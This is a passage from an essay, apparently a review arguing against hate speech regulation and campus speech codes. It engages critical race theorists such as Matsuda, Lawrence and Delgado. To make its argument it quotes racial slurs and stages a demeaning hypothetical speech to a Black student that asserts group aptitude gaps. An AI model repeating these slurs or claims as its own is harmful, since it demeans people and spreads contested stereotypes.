thecongruence of individual libel and group libel is not implausible, andmany critical race theorists argue for its resurrection. ThusMacKinnon urges "the rather obvious reality that groups are made up ofindividuals." That is why "libel of groups multiplies rather thanavoids the very same damage through reputation which the law ofindividual libel recognizes when done one at a time, as well asinflicting some of its own." What is wrong with the basic claim, endorsed by judges and scholarsacross the ideological spectrum, that group libel is just individuallibel multiplied? Begin with the assumption that individual libelinvolves the publication of information about someone that is bothdamaging and false. Charles Lawrence III inadvertently directs us tothe source of the problem. The racial epithet, he writes, "is invokedas an assault, not as a statement of fact that may be proven true orfalse." But that suggests that the evaluative judgments characteristicof racial invective do not lend themselves to factual verification--and this is where the comparison with individual libel breaks down.The same problem emerges when MacKinnon identifies pornography as aninstance of group defamation whose message is (roughly) that it wouldbe nice if women were available for sexual exploitation. A propositionof that form may be right or wrong, but it cannot be true or false.You cannot libel someone by saying, "I despise you"; but that isprecisely the message common to most racial epithets. "Nigger," usedin the vocative, is not usefully treated as group libel for the samereason that it is not usefully treated as individual libel. II. Critical race theory is strongest not when it seeks to establish abridgehead with constitutional precedent, but when it frontallycontests what has recently emerged as a central aspect of SupremeCourt First Amendment doctrine: the principle of content and viewpointneutrality. That principle is meant to serve as a guide to how speechcan permissibly be regulated, ensuring basic fairness by preventingthe law from favoring one partisan interest over another. So, forexample, a law forbidding the discussion of race would violate theprinciple of content-neutrality, which is held to be a bad thing; alaw forbidding the advocacy of black supremacy would violate theprinciple of viewpoint-neutrality, which is held to be a worse thing.When the Minnesota Supreme Court affirmed the content-sensitive hatespeech ordinance at issue in rav v. St. Paul, it cited Mari J.Matsuda's work in reaching its conclusions. When Justice Scaliareversed and invalidated the ordinance on the grounds of viewpointdiscrimination, he was implicitly writing against Matsuda's argument.These are not mere conflicts of academic vision; these are argumentswith judicial consequences. Matsuda's rejection of what she calls the "neutrality trap" is, to mymind, the most powerful element of her argument. Rather than trying tofashion neutral laws to further our social objectives, why not put ourcards on the table and acknowledge what we know? As an example ofwhere the neutrality trap leads, Matsuda cites the anti-mask statutesthat many states passed "in a barely disguised effort to limit Ku KluxKlan activities": These statutes purportedly cover the wearing of masks in general, withno specific mention of the intent to control the Klan. Neutral reasonssuch as the need to prevent pickpockets from moving unidentifiedthrough crowds or the need to unmask burglars or bank robbers areproffered for such statutes. The result of forgetting--or pretendingto forget--the real reason for anti-mask legislation is farcical.Masks are used in protest against terrorist regimes for reasons bothof symbolism and personal safety. Iranian students wearing masks andopposing human rights violations by the Shah of Iran, for example,were prosecuted under a California anti-mask statute. I call here foran end of such unknowing. We know why state legislatures--thosequirkily populist institutions--have passed anti-mask statutes. It ismore honest, and less cynically manipulative of legal doctrine tolegislate openly against the worst forms of racist speech, allowingourselves to know what we know. What makes Matsuda's position particularly attractive is that sheoffers a pragmatic, pro-civil liberties argument for content-specificity: The alternative to recognizing racist speech as qualitativelydifferent because of its content is to continue to stretch existingFirst Amendment exceptions, such as the "fighting words" doctrine andthe "content/conduct" distinction. This stretching ultimately weakensthe First Amendment fabric, creating neutral holes that removeprotection for many forms of speech. Setting aside the worst forms ofracist speech for special treatment is a non-neutral, value-ladenapproach that will better preserve free speech. At the very least, this approach would promise a quick solution to theabuse of "fighting words" ordinances. Consider Matsuda's own approachto legal sanctions for racist speech. By way of distinguishing "theworst, paradigm example of racist hate messages from other forms ofracist and non-racist speech," she offers three identifyingcharacteristics: The message is of racial inferiority. The message is directed against a historically oppressed group. The message is persecutory, hateful and degrading. The third element, she says, is "related to the `fighting words'idea"; and the first "is the primary identifier of racist speech"; butit is the second element that "attempts to further define racism byrecognizing the connection of racism to power and subordination." The second element is the one that most radically departs from thecurrent requirement that law be neutral as to content and viewpoint.But it would seem to forestall some of the abuses to which earlierspeech ordinances have been put, simply by requiring the victim of thepenalized speech to be a member of a "historically oppressed group."Surely there is something refreshingly straightforward about the callfor "an end to unknowing." Is Matsuda on to something? Not quite. Ironically enough, what tripsup the content-specific approach is that it can never be content-specific enough. Take a second look at Matsuda's three identifyingcharacteristics of paradigm hate speech. First, recall, that themessage is of racial inferiority. Now, Matsuda is clear that she wantsher definition to encompass, inter alia, anti-Semitic and anti-Asianprejudice; but anti-Semitism (as the philosopher Laurence Thomas, whois black and Jewish, observes) traditionally imputes to its object notinferiority, but iniquity. Moreover, anti-Asian prejudice often moreclosely resembles anti-Semitic prejudice than it does anti-blackprejudice. Surely anti-Asian prejudice that depicts Asians asmenacingly superior, and therefore as a threat to "us," is just aslikely to arouse the sort of violence that notoriously claimed thelife of Vincent Chin ten years ago in Detroit. More obviously, the test of membership in a "historically oppressed"group is either too narrow (just blacks) or too broad (just abouteverybody). Are poor Appalachians, a group I knew well from growing upin a West Virginia mill town, "historically oppressed" or "dominantgroup members"? Once we adopt the "historically oppressed" proviso, Isuspect, it is a matter of time before a group of black women inChicago are arraigned for calling a policeman a "dumb Polak." Evidencethat Poles are a historically oppressed group in Chicago will be inplentiful supply; the policeman's grandmother will offer poignantfirsthand testimony to that. III. The critique of neutrality would affect not simply how we draft ourordinances, but also how we conduct our litigation. One quickly movesfrom asking whether our statutes can or should be neutral to askingwhether the adjudication of these statutes can or should be neutral.Indeed, many legal pragmatists, mainstream scholars and critical racetheorists converge in their affirmation of the balancing approachtoward the First Amendment and their corresponding skepticism towardwhat could be called the "Skokie school" of jurisprudence. When theAmerican Civil Liberties Union defended the right of neo-Nazis tomarch in Skokie, a predominantly Jewish suburb of Chicago where anumber of Holocaust survivors lived, they wished to protect and tofortify the constitutional right at issue. Indeed, they may havereasoned, if a civil liberty can be tested and upheld in so odious anexercise of it, then the precedent will strengthen it for all the lessobnoxious cases where it may be disputed in the future. Hard casesharden laws. The strategy of the Skokie school relies on a number ofpresuppositions that critical legal theorists and others regard asdoubtful. Most importantly, it is premised on the neutral operation ofprinciple in judicial decisionmaking. But what if judges reallydecided matters in an unprincipled and political way, and invokedprinciples only by way of window dressing? In cases close-run enoughto require the Supreme Court to decide them, precedent and principleare elastic enough, or complex enough, that justices can often decideeither way without brazenly contradicting themselves. And even if thejustices want to make principled decisions, it may turn out that thefacts of the case--in the real-world cases that come before them--aretoo various and complicated ever to be overdetermined by the rule ofprecedent, stare decisis. In either event, it could turn out thatdefending neo-Nazis was just defending neo-Nazis. Moreover, it may be that the sort of formal liberties vouchsafed bythis process are not the sort of liberties that we need most. Perhapswe have been overly impressed by the frisson of defending bad peoplefor good causes, when the good consequences are at best conjecturaland the bad ones real and immediate. Perhaps, these critics conclude,it is time to give up the pursuit of abstract principles and insteaddefend victims against victimizers, achieving your results in thehere-and-now, not in the sweet hereafter. There is something to this position, but it is, like the position itis meant to rebuff, overstated. Nadine Strossen of the aclu can show,for example, that the organization's winning First Amendment defenseof the racist Father Terminiello in 1949 bore Fourteenth Amendmentfruit when the aclu was able to use the landmark Terminiello decisionto defend the free speech rights of civil rights protesters in the'60s and '70s. Granted, this may not constitute proof, which is anelusive thing in historical argument, but such cases do provide goodprima facie reason to think that the Skokie school has pragmaticjustification, not just blind faith, on its side. Another problem with the abandonment of principled adjudication iswhat it leaves in its wake: the case-by-case balancing of interests.My point is not that "normal" First Amendment jurisprudence cancompletely eschew balancing, but there is a difference betweenemploying it in background or in extremis and employing it as thefirst and only approach. An unfettered regime of balancing admits toomuch to judicial inspection. What we miss when we dwell on therarefied workings of high court decisionmaking is the way in whichlaws exert their effects lower down the legal food chain. It's beenpointed out that when police arrest somebody for loitering ordisorderly conduct, the experience of arrest--being hauled off to thestation and fingerprinted before being released--often is thepunishment. And "fighting words" ordinances have lent themselves tosimilar abuse. Anthony D'Amato, a law professor at Northwestern, makesa crucial and often overlooked point when he argues: "In some areas oflaw we do not want judges to decide cases at all--not justly or anyother way. In these areas, the mere possibility of judicialdecisionmaking exerts a chilling effect that can undermine what wewant the law to achieve." But what if that chilling effect is precisely what the law is designedfor? After all, one person's chill is another person's civility. It isclear, in any event, that all manner of punitive speech regulationsare meant to have effects far beyond the classic triad of deterrence,reform and retribution. IV. The main appeal of speech codes usually turns out to be expressive orsymbolic rather than consequential. That is, their advocates do notdepend on the claim that a speech-code statute will spare certaingroups some foreseeable amount of psychic trauma. They say, rather,that such a statute expresses a university's opposition to hate speechand bigotry; and more positively, that it symbolizes a commitment totolerance, to the creation of an educational environment in whichmutual colloquy and comity are preserved. In this spirit Matsuda writes that "a legal response to racist speechis a statement that victims of racism are valued members of ourpolity," and that "in a society that expresses its moral judgmentsthrough the law," the "absence of laws against racist speech istelling." In this same spirit Delgado suggests that a tort action forracist speech would have the effect of "communicating to theperpetrator and to society that such abuse will not be toleratedeither by its victims or by the courts" (italics mine). And also inthis spirit Thomas Grey, the Stanford law professor who helped draftthe campus speech regulations there, counsels that "authorities makethe most effective statement when they are honestly concerned to dosomething beyond making a statement," thus "putting their money wheretheir mouth is." The punitive function of speech codes is thusenlisted to expressive means, as a means of bolstering the credibilityof the anti-racist statement. Still, once we have admitted that the regulation of racist speech ispartly or wholly a symbolic act, we must register the force of theother symbolic considerations that may come into play. Thus, even ifyou think that the notion of free speech contains logicalinconsistencies, you need to register the symbolic force of itsfurther abridgement. And it is this level of scrutiny that may tip thebalance in the other direction. The controversy over flag-burning is agood illustration of the two-edged nature of symbolic arguments.Safeguarding the flag may symbolize something nice for some of us, butsafeguarding our freedom to burn the flag symbolizes something nicerfor others of us. Note, too, that the expressivist position suffers from anuncomfortable contradiction. A university administration that merelycondemns hate speech, without mobilizing punitive sanctions, is heldto have done little, to have offered "mere words." And yet thisskepticism about the power of "mere words" comports oddly with theattempt to regulate "mere words" that, since they are spoken by thosenot in a position of authority, would seem to have even less symbolicforce. Why is it "mere words" when a university only condemns racistspeech, but not "mere words" that the student utters in the firstplace? Whose words are "only words"? Why are racist words deeds, butanti-racist words just lip service? And is the verbal situation really as asymmetrical as it firstappears? Surely the rebuke "racist" also has the power to wound. Oneof the cases that arose under the University of Michigan speech codeinvolved a group discussion at the beginning of a dentistry class, inwhich the teacher, a black woman, sought to "identify concerns ofstudents." A student reported that he had heard, from his roommate,who was a minority, that minority students had a hard time in theclass and were not treated fairly. In response, the outraged teacherlodged a complaint against the student for having accused her (as sheperceived it) of racism. For this black woman, at least, even anindirect accusation of racism apparently had the brunt of racialstigmatization. One other paradox fissures the hate speech movement. Because thesescholars wish to show that substantial restrictions on racist speechare consistent with the Constitution, they must make the case thatracist speech is sui generis among offensive or injurious utterances;otherwise the domain of unprotected speech would mushroom beyond thepoint of constitutional and political plausibility. "Words ThatWound," the title of Delgado's pioneering essay, designates a categorythat includes racist speech but is scarcely exhausted by it. Nor couldwe maintain that racist insults, which tend to be generic, arenecessarily more wounding than an insult tailor-made to hurt someone:being jeered at for your acne or your obesity may be far more hurtfulthan being jeered at for your race or your religion. Alert to this consideration, scholars like Matsuda, Lawrence andDelgado argue that racist speech is peculiarly deserving ofcurtailment precisely because it participates in (and is at leastpartly constitutive of) the larger structures of racism that are"hegemonic" in our society. "Black folks know that no racial incidentis `isolated' in the United States," writes Lawrence: That is what makes the incidents so horrible, so scary. It is theknowledge that they are not the isolated unpopular speech of adissident few that makes them so frightening. These incidents aremanifestations of a ubiquitous and deeply ingrained cultural beliefsystem, an American way of life.To this consideration Matsuda annexes the further argument that whatdistinguishes racist speech from other forms of unpopular speech is"the universal acceptance of the wrongness of the doctrine of racialsupremacy." Unlike Marxist speech, say, racist speech is "universallycondemned." At first blush, this is a surprising claim. After all, if racistspeech really were universally rejected, ordinances against it wouldbe an exercise in antiquarianism. And yet there is something in whatMatsuda says: a shared assumption about the weight of the anti-racistconsensus, a conviction that at least overt racists are an unpopularminority, that authority is likely to side with us against them. Thishopeful conviction about the magnitude of racist expression in Americaprovides the hidden and rather unexpected foundation for the hatespeech movement. Why would you entrust authority with enlarged powersof regulating the speech of unpopular minorities, unless you wereconfident that the unpopular minorities would be racists, not blacks?Lawrence may know that racial incidents are never "isolated," but hemust also believe them to be less than wholly systemic. You don't goto the teacher to complain about the school bully unless you know thatthe teacher is on your side. The tacit confidence of critical race theory in the anti-racistconsensus also enables its criticism of neutral principles. Thisbecomes clear when one considers the best arguments in favor of suchprinciples. Thus David Coles, a law professor at GeorgetownUniversity, suggests that in a democratic society the only speech government is likely tosucceed in regulating will be that of the politically marginalized. Ifan idea is sufficiently popular, a representative government will lackthe political wherewithal to suppress it, irrespective of the FirstAmendment. But if an idea is unpopular, the only thing that mayprotect it from the majority is a strong constitutional norm ofcontent-neutrality. Reverse his assumptions about whose speech is marginalized and youstand the argument on its head. If blatantly racist speech isunpopular and stigmatized, a strong constitutional norm of content-neutrality may be its best hope for protection. For these critics,however, that is a damning argument against content-neutrality. This, then, is the political ambiguity that haunts the new academicactivism. "Our colleagues of color, struggling to carry the multipleburdens of token representative, role model and change agent inincreasingly hostile environments, needed to know that theinstitutions in which they worked stood behind them," declare ourcritical race theorists in their joint manifesto. Needed to know thatthe institutions in which they worked stood behind them: I havedifficulty imagining this sentiment expressed by activists in the'60s, who defined themselves in a proudly adversarial relation toauthority and its institutions. Here is the crucial difference thistime around. The contemporary aim is not to resist power, but toenlist power. V. "Critical race theory challenges ahistoricism and insists on acontextual/historical analysis of the law." So states the manifesto,and it is not necessarily a bad principle. What it suggests to me,however, is that we get down to cases, and consider, as thesetheorists do not, the actual results of various regimes of hate speechregulation. Surveying United Nations conventions urging the criminalization ofracist speech, Matsuda bemoans the fact that the United States, out ofFirst Amendment scruple, has declined fully to endorse suchresolutions. By contrast, she commends to our attention nations suchas Canada and the United Kingdom. Canada's appeal to the hate speechmovement is obvious; after all, the new Canadian Bill of Rights hasnot been allowed (as Matsuda observes) to interfere with its nationalstatutes governing hate propaganda. And Canada's Supreme Court hasrecently promulgated MacKinnon's statutory definition of pornographyas the law of the land. What you don't hear from the hate speechtheorists is that the first casualty of the MacKinnonite anti-obscenity ruling was a gay and lesbian bookshop in Toronto, which wasraided by the police because of a lesbian magazine it carried.(Homosexual literature is a frequent target of Canada's restrictionson free expression.) Nor are they likely to mention that in Junecopies of Black Looks: Race and Representation by the well-known blackfeminist scholar Bell Hooks, a book widely assigned in women's studiescourses, was confiscated by Canadian authorities as possible "hateliterature." Is the Canadian system really a beacon of hope? Even more perplexing, especially in the context of an insistence onchallenging ahistoricism and attending to context, is the nominationof Britain as an exemplar of a more enlightened free speechjurisprudence. Does anyone believe that racism has subsided in Britainsince the adoption of the 1965 Race Relations Act forbidding racialdefamation? Or that the legal climate in that country is moreconducive to searching political debate? Ask any British newspapermanabout that. When Harry Evans, then editor of the London Times,famously proclaimed that the British press was, by comparison to ours,only "half-free," he was not exaggerating much. The result ofBritain's judicial climate is to make the country a net importer oflibel suits launched by tycoons who are displeased with theirbiographers. Everyone knows that a British libel suit is like a Renodivorce. It is rather a mordant irony that American progressivesshould propose Britain, and its underdeveloped protection ofexpression, as a model to emulate at a time when many progressives inBritain are agitating for a bill of rights and broad First Amendment-style protections. And what of speech codes on American campuses? The record may surprisesome advocates of regulations. "When the aclu enters the debate bychallenging the University of Michigan's efforts to provide a safeharbor for its Black, Latino and Asian students," Lawrence writes, "weshould not be surprised that nonwhite students feel abandoned." Inlight of the actual record of enforcement, however, the situationmight be viewed differently. During the year in which Michigan'sspeech code was enforced, more than twenty blacks were charged--bywhites--with racist speech. As Strossen notes, not a single instanceof white racist speech was punished, a fact that makes Lawrence's talkof a "safe harbor" seem more wishful than informed. At Michigan, a full disciplinary hearing was conducted only in thecase of a black social work student who was charged with saying, in aclass discussion of research projects, that he believed homosexualitywas an illness, and that he was developing a social work approach tomove homosexuals toward heterosexuality. ("These charges will haunt mefor the rest of my life," the student claimed in a court affidavit.)By my lights, this is a good example of how speech codes killcritique. I think that the student's views about homosexuality (whichmay or may not have been well-intentioned) are both widespread andunlikely to survive intellectual scrutiny. Regrettably, we have notyet achieved a public consensus in this country on the morallegitimacy (or, more precisely, the moral indifference) ofhomosexuality. Yet it may well be that a class on social work is notan inappropriate forum for a rational discussion of why the "disease"model of sexual difference has lost credibility among socialscientists. (In a class on social work, this isn't p.c. brainwashing,this is education.) The trouble is, you cannot begin to conduct thisconversation when you outlaw the expression of the view that you wouldcriticize. Critical race theorists are fond of the ideal of conversation. "Thischapter attempts to begin a conversation about the First Amendment,"Matsuda writes toward the end of her contribution. "Most important, wemust continue this discussion," Lawrence writes toward the end of his.It is too easy to lose sight of the fact that the conversation towhich they are devoted is aimed at limiting conversation. If there arecosts to speech, then there are costs also to curtailing speech, oftenunpredictable ones. Speech codes, to be sure, may be more narrowly and responsiblytailored, and the Stanford rules--carefully drafted by scholars, likeThomas Grey, with civil libertarian sympathies--have rightly beentaken as a model of such careful delimitation. For rather thanfollowing the arguments against racist speech to their naturalconclusion, the Stanford rules prohibit only insulting expression thatconveys "direct and visceral hatred or contempt" for people on thebasis of their sex, race, color, handicap, religion, sexualorientation or national and ethnic origin, and that is "addresseddirectly to the individual or individuals whom it insults orstigmatizes." Chances are, the Stanford rule won't do much harm. Chances are, too,it won't do much good. As long as the eminently reasonable Grey isdrafting and enforcing the restrictions, I won't lose much sleep overit. Yet we must be clear how inadequate the code is as a response tothe powerful arguments that were marshaled to support it. Contrast thefollowing two statements addressed to a black freshman at Stanford: LeVon, if you find yourself struggling in your classes here, youshould realize it isn't your fault. It's simply that you're thebeneficiary of a disruptive policy of affirmative action that placesunderqualified, underprepared and often undertalented black studentsin demanding educational environments like this one. The policy'segalitarian aims may be well-intentioned, but given the fact thataptitude tests place African Americans almost a full standarddeviation below the mean, even controlling for socioeconomicdisparities, they are also profoundly misguided. The truth is, youprobably don't belong here, and your college experience will be a longdownhill slide. Out of my face, jungle bunny. Surely there is no doubt which is likely to be more "wounding" andalienating to its intended audience. Under the Stanford speechregulations, however, the first is protected speech, and the secondmay well not be: a result that makes a mockery of the words-that-woundrationale. If you really want to penalize such wounding words, it makes no senseto single out gutter epithets--which, on many college campuses, aremore likely to stigmatize the speaker than their intended victim--andleave the far more painful disquisition alone. In American societytoday, the real power commanded by racism is likely to vary inverselywith the vulgarity with which it is expressed. Black professionalssoon learn that it is the socially disfranchised--the lower class, thehomeless--who are most likely to hail them as "niggers." The circlesof power have long since switched to a vocabulary of indirection.Unfortunately, those who pit the First Amendment against theFourteenth Amendment invite us to worry more about speech codes thancoded speech. I suspect that many of those liberals who supported Stanford'srestrictions on abusive language did so because they thought it wasthe civil thing to do. Few imagined that, say, the graduation rates orgpas of Stanford's blacks (or Asians, gays, and so on) are likely torise significantly as a result. Few imagined, that is, that therestrictions would lead to substantive rights or minority empowerment.They just believed that gutter epithets violate the sort of civilitythat ought to prevail on campus. In spirit, then, the new regulationswere little different from the rules about curfews, drinking or theafter-hours presence of women in male dormitories that once governedAmerica's campuses and preoccupied their disciplinary committees. Not that rules about civility are without value. Lawrence charges thatcivil libertarians who disagree with him about speech regulations maybe "unconscious racists." I don't doubt this is so; I don't doubt thatsome of those who support speech codes are unconscious racists. What Idoubt is whether the imputation of racism is the most effective way toadvance the debate between civil rights and civil liberties. VI. "What is ultimately [some stuff seems to be wiped here -meng]society," write the authors of Words That Wound, and they are right.In parsing the reasoning of the movement against hate speech, it isessential that we not miss the civic forest for the legal trees. Farbeyond the wrangling over particular statutes and codes lies anencompassing vision of state and civil society. And its wellspringsare to be found not in legal scholarship or critical theory, but inthe more powerful cultural currents identified with the "recoverymovement." At the vital center of the hate speech movement is the seductivevision of the therapeutic state. This vision is presaged in themanifesto itself: Too often victims of hate speech find themselves without the words toarticulate what they see, feel and know. In the absence of theory andanalysis that give them a diagnosis and a name for the injury theyhave suffered, they internalize the injury done them and are renderedsilent in the fact of continuing injury. Critical race theory namesthe injury and identifies its origins. This sounds, of course, like a popular primer on how psychotherapy issupposed to work; with a few changes, the passage might be addressedto survivors of toxic parenting. Indeed, "alexathymia"--the inabilityto name and articulate one's feelings--is a faddish diagnosis inpsychiatry these days. Nor is critical race theory's affinity with thebooming recovery industry a matter of chance. These days the recoverymovement is perhaps the principal source of resistance to the olderand much-beleaguered American tradition of individualism. "When the ideology is deconstructed and injury is named, subordinatedvictims find their voices," the manifesto asserts. "They discover theyare not alone in their subordination. They are empowered." Here therecovery/survivor-group paradigm leads to a puzzling contradiction. Weare told that victims of racist speech are cured--that is, empowered--when they learn they are "not alone" in their subordination, butsubordinated as a group. But elsewhere we are told that what makesracist speech peculiarly wounding is that it conveys precisely themessage that you are a member of a subordinated group. How can thesuggestion of group subordination be the poison and the antidote? The therapeutic claims made for critical race theory cut against thehate speech offensive in more important ways. For if we took theseclaims at face value, critical race theory would not buttress speechregulations, it would obviate the need for them. The problem aboutwhich Lawrence worries, that racist speech "silenc[es] members ofthose groups who are its targets," would naturally be addressed notthrough bureaucratic regulations, but through the sort ofdeconstruction and critique that will enable victims, according tocritical race theory, to "find their voices." And here lies anotherpainful irony. All this sounds very much like Justice Brandeis's hoaryand much-scorned prescription for redressing harmful speech: "morespeech." Scholars such as Delgado and Matsuda understandably emphasize theadverse psychological effects of racial abuse. "Because theyconstantly hear racist messages, minority children, not surprisingly,come to question their competence, intelligence and worth," Delgadowrites. And he further notes that the psychic injuries incurred byracist speech have additional costs down the road: "The person who istimid, withdrawn, bitter, hypertense or psychotic will almostcertainly fare poorly in employment settings." (As a member of theHarvard faculty, I would venture that there are exceptions to thisrule.) But the proposed therapeutic regime is no mere talking cure.Indeed, in the Republic of Self-Esteem, we are invited to conceive ofthe lawsuit as therapy. "When victimized by racist language," Delgadoexplains, "victims must be able to threaten and institute legalaction, thereby relieving the sense of helplessness that leads topsychological harm." A similar therapeutic function could be played by criminalproceedings, in Matsuda's view. When the government does nothing aboutracist speech, she argues, it actually causes a second injury. "Thesecond injury is the pain of knowing that the government provides noremedy and offers no recognition of the dehumanizing experience thatvictims of hate propaganda are subjected to." In fact, "Thegovernment's denial of personhood through its denial of legal recoursemay even be more painful than the initial act of hatred." Of course,what this grievance presupposes is that the state is there, in locoparentis, to confer personhood in the first place. Finally Matsudamust repair not to an instrumental conception of the state, but to aconception of it as the "official embodiment of the society we livein," which is rather remote and abstracted from the realities of ourheterogeneous populace, with its conflicting norms and jostlingvalues. Psychotherapy cannot do the hard work of politics. Yet a similartherapeutic vision animates the more broad-gauged campus regulationssuch as those adopted in the late 1980s at the University ofConnecticut. These rules sought to proscribe such behavior as, interalia: Treating people differently solely because they are in some waydifferent from the majority.... Imitating stereotypes in speech or mannerisms.... Attributing objections to any of the above actions to"hypersensitivity"of the targeted individual or group. That last provision was especially cunning. It meant that even if youbelieved that a complainant was overreacting to an innocuous remark,the attempt to defend yourself in this way would serve only as proofof your guilt. The rationale of the university's rules was made explicit in itsgeneral prohibition on actions that undermined the "security or self-esteem" of persons or groups. (Would awarding low grades count?) Notsurprisingly, the university's expressed objective was to provide "apositive environment in which everyone feels comfortable working orliving." It was unclear whether any provisions were to be made forthose who did not feel "comfortable" working or living under suchrestrictive regulations. In any event, they were later dropped underthreat of legal action. It may be that widespread skepticism about the distinction between thepublic and the private made it inevitable that the recovery movementwould translate into a politics; and that this politics would centeron a vocabulary of trauma and abuse, in which the verbal forms and thephysical forms are seen as equivalent. Perhaps it was inevitable thatthe citizen at the center of the political theory of the Enlightenmentwould be replaced by the infant at the center of modern depthpsychology and its popular therapeutic variants. The inner child mayhurt and grieve, as we have been advised. But may the inner child alsovote? VII. What cannot be sidestepped, finally, is the larger question, thepolitical question, of how we came to decide that our energies werebest directed not at strengthening our position in the field of publicdiscourse, but at trying to move its boundary posts. I detect twomotivations. In the academy, there has been increased attention to the formativepower of language in the construction of our social reality, tolanguage as "performative," as itself counting as action andconstituting a "speech act." These are phrases and ideas that are owedto ordinary language philosophy, of the kind that the Oxfordphilosopher J.L. Austin developed in the middle of the century, butnow MacKinnon adds them to her argumentative arsenal in her latestbook. The notion of the speech act certainly acquires new force whenthe act in question is rape. MacKinnon's emphasis on the realness, the act-like nature, ofexpression receives an interesting twist in the attempt by some hatespeech theorists to "textualize" the Fourteenth Amendment. Ifexpression is act, then act must be expression. If the First Amendmentis about speech, then so, too, is the Fourteenth Amendment. Followingthis reasoning, Lawrence has proposed in an influentialreinterpretation of legal history that Brown v. Board, and, byanalogy, all subsequent civil rights decisions and legislation, are infact prohibitions on expressive behavior. In Lawrence's reading, theyforbid not racism, but the expression of racism. In line with thisargument, he tells us that "discriminatory conduct is not racistunless it also conveys the message of white supremacy," thuscontributing to the social construction of racism. This is a bold and unsettling claim, which commits Lawrence to theview that in the case of discriminatory conduct, the only crime is toget caught. By this logic, racial redlining by bankers is not racistunless people find out about it. And the crusading district attorneywho uncovers hidden evidence of those bankers' discrimination is notto be hailed as a friend of justice, after all: by bringing it tolight, he was only activating the racist potential of those misdeeds.Should anti-discrimination policy be founded, then, on the principleof "don't ask, don't tell"? Lawrence's analysis of segregation reaches the same surprisingconclusion: "The nonspeech elements are byproducts of the main messagerather than the message being simply a by-product of unlawfulconduct." By this logic, poverty is not really about materialdeprivation; it is really about the message of class inequality. Wemight conclude, then, that the problem of economic inequality wouldmost naturally be redressed by promulgating a self-affirmative lower-class identity along the lines of Poverty Is Beautiful. Words may notbe cheap, but they are much less costly than afdc and job trainingprograms. Something, let us agree, has gone very wrong. The pendulum has swungfrom the absurd position that words don't matter to the equally absurdposition that only words matter. Critical race theory, it appears, hasfallen under the sway of a species of academic nominalism. Yes, speechis a species of action. Yes, there are some acts that only speech canperform. But there are some acts that speech alone cannot accomplish.You cannot heal the sick by pronouncing them well. You cannot lift upthe poor by declaring them rich. In their manifesto, the authors of Words That Wound identify theirfight as "a fight for a constitutional community where `freedom' doesnot implicate a right to degrade and humiliate another human being."These are heady words. Like much sweepingly utopian rhetoric, however,they invite a regime so heavily policed as to be incompatible withdemocracy. Once we are forbidden verbally to degrade and to humiliate,will we retain the moral autonomy to elevate and to affirm? In the end, the preference for the substantive liberties supposedlyvouchsafed by the Fourteenth Amendment over the formal ones enshrinedin the First Amendment rehearses the classic disjunction that IsaiahBerlin analyzed a generation ago in "Two Conceptions of Liberty," butwithout having learned from him. Berlin's words have aged little."Negative" liberty, the simple freedom from external coercion, seemedto him a truer and more humane ideal than the goals of those who seekin the great, disciplined, authoritarian structures the ideal of"positive" self-mastery by classes, or peoples or the whole ofmankind. It is truer, because it recognizes the fact that human goalsare many, not all of them commensurable, and in perpetual rivalry withone another. To suggest, as the critical race theorists do, thatequality must precede liberty is simply to jettison the latter withoutsecuring the former. The First Amendment may not secure us substantiveliberties, but neither will its abrogation. It is not hard to explain the disenchantment among minority criticswith such liberal mainstays as the "marketplace of ideas" and theideal of public discourse. I take their disenchantment to be a part ofa larger crisis of faith. The civil rights era witnessed thedevelopment of a national consensus--hammered out noisily, and againstsignificant resistance--that racism, at least overt racism, was wrong.Amazingly enough, things like reason, argument and moral suasion didplay a significant role in changing attitudes toward "race relations."But what have they done for us lately? For all his good sense, Harry Kalven Jr. was spectacularly wrong whenhe wrote: "One is tempted to say that it will be a sign that the Negroproblem has basically been solved when the Negro begins to worry aboutgroup libel protection." Quite the contrary. The disillusionment withliberal ideology that is now rampant among many minority scholars andactivists stems from the lack of progress in the struggle for racialequality over the past fifteen years. Liberalism's principle of formalequality seems to have led us so far, but no further. As Patricia J.Williams observes, it "put the vampire back in its coffin but it wasno silver stake." The problem may be that the continuing economic and materialinequality between black America and white America, and the continuingimmiseration of large segments of black America, cannot be erasedsimply through better racial attitudes. Poverty, white and black, cantake on a life of its own, to the point that removing the conditionsthat caused it can do little to alleviate it. The '80s may have beenthe "Cosby Decade," but you wouldn't know it from the South Bronx. Ithas become clear, in other words, that the political economy of raceand poverty can no longer be reduced to a mirror of what whites thinkof blacks. In some ways the intellectuals have not caught up to this changingreality. Generals are not the only ones who are prone to fight thelast war. Rather than responding to the grim new situation with newand subtler modes of socioeconomic analysis, we have finessed the gapbetween rhetoric and reality by forging new and subtler definitions ofthe word "racism." Hence a new model of institutional racism is onethat can operate in the absence of actual racists. By redefining ourterms, we can always say of the economic gap between black and whiteAmerica: the problem is still racism ... and, by stipulation, it wouldbe true. But the grip of this vocabulary has tended to foreclose themore sophisticated models of political economy that we so desperatelyneed. I cannot otherwise explain why some of our brightest legal mindsbelieve that substantive liberties can be vouchsafed and substantiveinequities redressed by punishing rude remarks; or why their analysisof racism owes more to the totalizing theory of Catharine MacKinnonthan to the work of scholar-investigators like Douglas Massey orWilliam Julius Wilson or Gary Orfield--people who, whatever theirdifferences, are attempting to discover how things work in the realworld, never confusing the empirical with the merely anecdotal. Critical race theory has served, then, as a labor-saving device. Forif racism can be fully textualized, if its real existence is in itsarticulation, then racial inequity can be prized free from the mossand soil of political economy. "Gender is sexual," MacKinnon wrote inToward a Feminist Theory of the State. "Pornography constitutes themeaning of that sexuality." By extension, racist speech must prove tobe the real content of racial subordination: banish it, and you banishsubordination. The perverse result is a see-no-evil, hear-no-evilapproach toward racial inequality. Unfortunately, even if hate diddisappear, aggregative patterns of segregation and segmentation inhousing and employment would not disappear. And conversely, in theabsence of this material and economic gap, not many people would careabout racist speech. Beliefs that go untested and unchallenged cannot prosper. The criticalrace theorists must be credited with helping to reinvigorate thedebate about freedom of expression; the intelligence, the innovationand the thoughtfulness of their best work deserve a reasoned response,and not, as so often happens, demonization and dismissal. And yet, forall the passion and all the scholarship that the critical racetheorists have expended upon the problem of hate speech, I cannotbelieve that it will capture their attention for very much longer. "Itis strange how rapidly things change," wrote Kalven in 1965. "Just alittle more than a decade ago we were all concerned with devisinglegal controls for the libeling of groups.... Ironically, once thevictory was won, the momentum for such legal measures seemed todissipate, and the problem has all but disappeared from view." It isstrange how rapidly things change--and change back. But the results, Isuspect, will be similar this time around. The advocates of speechrestrictions will grow disenchanted not with their failures, but withtheir victories, and the movement will come to seem yet anothercurious byway in the long history of our racial desperation. And yet the movement will not have been without its political costs. Icannot put it better than Charles Lawrence himself, who writes: "Ifear that by framing 